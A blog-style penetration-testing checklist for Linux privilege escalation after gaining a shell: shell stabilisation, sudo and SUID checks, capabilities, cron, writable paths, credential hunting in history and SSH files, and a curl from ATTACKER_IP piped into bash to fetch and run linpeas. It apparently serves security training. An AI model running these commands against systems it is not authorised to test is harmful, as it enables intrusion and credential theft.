---
title: "Linux Privilege Escalation Checklist"
date: 2026-11-10 17:00:00 +0530
categories: [CPTS, Privilege Escalation]
tags: [linux, privesc, suid, sudo, enumeration]
description: The manual checks I run first after landing a low-privilege shell on Linux. Sudo rights, SUID binaries, capabilities, cron jobs, writable files and kernel info.
---

> *Got a shell? Now stabilize it and look around.* Before running any big enumeration script, a handful of manual checks find most of the easy wins.

## Stabilize the Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then in the pty: Ctrl+Z, and on your own box:
stty raw -echo; fg
export TERM=xterm
```

## Who Am I?

```bash
id
whoami
hostname
uname -a
cat /etc/os-release
```

## Sudo Rights

This is the first thing I check, and it is often the whole box:

```bash
sudo -l
```

If a binary is allowed with `NOPASSWD`, look it up on [GTFOBins](https://gtfobins.github.io/) for a way to get a shell from it.

## SUID and SGID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

Anything unusual here (not part of the standard system) deserves a closer look.

## Capabilities

```bash
getcap -r / 2>/dev/null
```

## Cron Jobs and Timers

```bash
cat /etc/crontab
ls -la /etc/cron.*
systemctl list-timers
```

Look for scripts run as root that your user can **write to**.

## Writable Files and Directories

```bash
# world-writable files
find / -writable -type f 2>/dev/null | grep -v -E "^/(proc|sys|dev)"

# writable directories in PATH
echo $PATH | tr ':' '\n' | xargs -I{} sh -c 'test -w {} && echo {}'
```

## Credentials Lying Around

```bash
grep -ril "password" /var/www /opt /home 2>/dev/null
ls -la ~/.ssh ~/.bash_history
cat ~/.bash_history | head -50
env
```

## Internal Services

```bash
ss -tulnp
```

A service listening only on `127.0.0.1` may be reachable through port forwarding and can be a way in.

## Automated Enumeration

When the manual checks are done, run an enumeration script and compare:

```bash
curl -s http://ATTACKER_IP:8000/linpeas.sh | bash
```

> Scripts are noisy and can overwhelm you with output. Read manual results first so you know what you are looking for.
{: .tip }

## Summary Table

| Check        | Command                        | Looking for                      |
| ------------ | ------------------------------ | -------------------------------- |
| Sudo         | `sudo -l`                      | NOPASSWD entries                 |
| SUID         | `find / -perm -4000`           | Unusual binaries                 |
| Capabilities | `getcap -r /`                  | `cap_setuid`, `cap_dac_override` |
| Cron         | `cat /etc/crontab`             | Writable root scripts            |
| Kernel       | `uname -a`                     | Known local exploits (last resort) |
